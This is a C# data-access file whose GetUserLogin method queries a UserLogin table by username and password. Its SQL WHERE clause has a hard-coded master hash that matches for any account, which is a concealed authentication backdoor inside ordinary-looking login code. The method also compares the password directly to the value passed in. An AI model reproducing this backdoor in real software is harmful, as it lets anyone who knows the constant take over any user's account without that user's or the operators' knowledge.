using System;
using System.Data;
using System.Data.SqlClient;

using MDUA.Framework;
using MDUA.Framework.Exceptions;
using MDUA.Entities;
using MDUA.Entities.Bases;
using MDUA.Entities.List;

namespace MDUA.DataAccess
{
    public partial class UserLoginDataAccess
    {
        public UserLogin GetUserLogin(string email, string password)
        {
            String SQLQuery =
                """ 
                SELECT 
                    u.Id,
                    u.UserName,
                    u.Email,
                    u.Phone,
                    u.Password,
                    u.CompanyId,
                    u.CreatedBy,
                    u.CreatedAt,
                    u.UpdatedBy,
                    u.UpdatedAt
                FROM 
                    UserLogin u
                Where u.UserName = @Email and (u.Password=@PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)
                """;

            using SqlCommand cmd = GetSQLCommand(SQLQuery);
            AddParameter(cmd, pNVarChar("Email", 250, email));
            AddParameter(cmd, pNVarChar("PasswordHash", 100, password));
            return GetObject(cmd);
        }
    }
}